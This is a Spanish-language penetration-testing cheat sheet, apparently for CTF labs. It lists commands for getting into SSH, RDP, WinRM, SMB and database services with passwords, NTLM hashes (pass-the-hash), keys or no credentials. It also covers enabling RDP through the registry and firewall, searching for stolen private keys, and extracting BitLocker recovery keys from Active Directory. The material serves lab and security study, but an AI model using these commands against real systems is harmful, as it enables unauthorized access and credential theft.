---
topic: remote-access
tags: [access, ssh, rdp, winrm, smb, bitlocker, credentials]
---

# Cómo entrar: según el servicio y lo que tengas

[🇬🇧 English](remote-access.en.md) | **Español**

> Chuleta de acceso. Primero decide **qué tienes** (nada, contraseña, hash, clave, ticket) y **qué servicio** está abierto; el comando sale de ahí.

## Tabla de decisión

| Tengo | SSH | RDP | WinRM | SMB | BD |
|---|---|---|---|---|---|
| Contraseña | `ssh u@host` | `xfreerdp` | `evil-winrm -p` | `smbclient -U u%p` | `mysql -u -p` |
| Sólo hash NTLM | ✗ (probar `ssh` con clave) | `xfreerdp /pth:HASH` | `evil-winrm -H HASH` | `psexec.py -hashes :H` | ✗ |
| Clave privada | `ssh -i key u@host` | — | — | — | tunnel |
| Sin credenciales | banner/`root` sin pass | — | — | sesión nula | `redis` sin auth |
| Ticket Kerberos | — | — | `-r` con ticket | `-k -no-pass` | — |

## SSH

```bash
ssh user@host
ssh -i id_rsa user@host                       # clave
chmod 600 id_rsa                              # si se queja de permisos
ssh -o PreferredAuthentications=password user@host
ssh -J user@jump user@internal                # ProxyJump
ssh -L 8080:127.0.0.1:8080 user@host          # túnel local
ssh -R 9001:127.0.0.1:9001 user@host          # túnel inverso
ssh -D 1080 user@host                         # SOCKS
scp -r file user@host:/tmp/                   # copiar
sshfs user@host:/ /mnt/remote                 # montar
```

Si sólo hay clave y no la tienes: buscar `id_rsa` en `/proc`, en backups, en `.ssh` de otros usuarios con permisos flojos, o en un heapdump/config.

## RDP (Windows)

```bash
xfreerdp /v:host /u:user /p:'pass' /cert:ignore /dynamic-resolution
xfreerdp /v:host /u:user /pth:NTHASH /cert:ignore /admin   # restricted admin
xfreerdp /v:host /drive:share,/home/kali/share             # mover ficheros
```

- Habilitar RDP si tienes admin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f` + firewall.
- Windows sin RDP en el firewall: `netsh advfirewall firewall add rule name="rdp" dir=in action=allow protocol=TCP localport=3389`.
- Sesiones: `qwinsta`, `tscon <id> /dest:<sesión>` si eres SYSTEM.

## WinRM

```bash
evil-winrm -i host -u user -p 'pass'
evil-winrm -i host -u user -H NTHASH
evil-winrm -i host -u user -p 'pass' -s /scripts -e /exes    # upload/download
```

Puertos 5985 (HTTP) y 5986 (HTTPS). Alternativas: `winrs -r:host cmd`, o `wmiexec.py`.

## SMB

```bash
smbclient -L //host -N                        # sesión nula
smbclient //host/share -U 'user%pass'
smbclient //host/share -U user --pw-nt-hash HASH
impacket-psexec domain/user:pass@host
impacket-wmiexec domain/user@host -hashes :HASH
nxc smb host -u user -p pass --shares --sessions
```

## Bases de datos y servicios sin credenciales

```bash
mysql -h host -u root -p'' -e 'select 1'
psql "host=host user=postgres password=pass dbname=postgres"
redis-cli -h host            # info; keys *; en 6379 sin auth
impacket-mssqlclient user:pass@host -windows-auth
ftp anonymous@host           # FTP anónimo
telnet host                  # a veces root sin contraseña
```

## BitLocker: la clave de recuperación

Cuando un disco está cifrado y no puedes leer lo que hay dentro (`user.txt`, `NTDS.dit`, un backup), lo que necesitas es la **recovery key**, no fuerza bruta.

Detectar:

```powershell
manage-bde -status
Get-BitLockerVolume
Get-BitLockerVolume -MountPoint D: | Select-Object MountPoint,ProtectionStatus,KeyProtector
```

Dónde suele estar (la clave se respalda en AD cuando el equipo está en dominio):

```powershell
# en el DC, con una cuenta de dominio
Get-ADObject -Filter 'ObjectClass -eq "msFVE-RecoveryInformation"' `
  -SearchBase (Get-ADComputer <EQUIPO>).DistinguishedName `
  -Properties msFVE-RecoveryPassword

# si no sabes el equipo, busca todos
Get-ADObject -LDAPFilter '(objectClass=msFVE-RecoveryInformation)' -Properties msFVE-RecoveryPassword |
  Select-Object Name,msFVE-RecoveryPassword
```

```bash
ldapsearch -x -H ldap://<DC> -D 'user@dom.htb' -w 'pass' \
  -b 'DC=dom,DC=htb' '(objectClass=msFVE-RecoveryInformation)' msFVE-RecoveryPassword
```

Otras fuentes: GPO, scripts de despliegue, `Intune`/Entra, ficheros de configuración, correos en el perfil, y backups de `AD` (`ntds.dit`). Si el volumen es un backup montado, la clave puede estar en el propio `README` del share.

Usarla:

```powershell
manage-bde -unlock D: -RecoveryPassword <CLAVE-48-DIGITOS>
manage-bde -status D:
manage-bde -protectors -disable C:          # sólo en lab
```

Offline (disco montado en Linux, por ejemplo un `.vhd`):

```bash
dislocker -V /dev/sdb1 -p<CLAVE> -r /mnt/clear
```

## Reglas que ahorran horas

- Un hash sirve para WinRM/SMB con *restricted admin*, **no** para SSH.
- Una clave sirve para SSH, no para RDP (salvo que la puedas inyectar en `authorized_keys`).
- El puerto 22 abierto con SSH moderno no admite `root:root`: prueba la contraseña en otros usuarios.
- Si `ssh` falla con "Permission denied (publickey)" y tienes contraseña, fuerza `password`.
- BitLocker no se rompe: se busca la clave donde el sistema la guardó.

## Referencias

- <https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/recovery/>
- <https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html>
- <https://github.com/Hackplayers/evil-winrm>
